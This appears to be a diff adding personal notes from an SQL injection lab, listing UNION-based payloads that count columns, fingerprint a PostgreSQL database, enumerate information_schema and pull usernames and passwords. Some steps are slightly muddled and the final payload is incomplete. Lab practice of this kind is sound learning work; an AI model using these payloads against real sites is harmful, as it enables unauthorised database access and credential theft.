@@ -1,0 +1,36 @@
+Doing an SQLi with a UNION attack on filter parameter
+
+Objective: Show the tables and get admin user count
+
+
+STEP1: Determining the number of columns:
+payload: '+order+by+2--
+output: There is 2 columns
+
+
+STEP 2: Determining the type data in each columns:
+payload: 'UNION+SELECT+'a',+'a'--
+output: The 2 columns can contain string data
+
+
+STEP3: Determining the version of the DB:
+payload: ' UNION SELECT @@version, NULL-- -> not MS or MYSQL
+        -' UNION SELECT version(), NULL-- -> PostgreSQL
+
+
+STEP4: Display the Tables
+payload: - ' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+
+STEP5: Display The columns
+
+payload: - ' UNION SELECT column_name , NULL FROM information_schema.columns WHERE table_name = 'pg_user_mappings'--
+Output :Columns called 'users_daptcf'
+
+NEW payload : - ' UNION SELECT column_name , NULL FROM information_schema.columns WHERE table_name = 'users_daptcf'--
+output: username_wrlbgi and password_rcsxfx
+
+
+STEP6: retrieve the data
+
+payload: - ' UNION SELECT username_wrlbgi , password_rcsxfx from users_daptcf
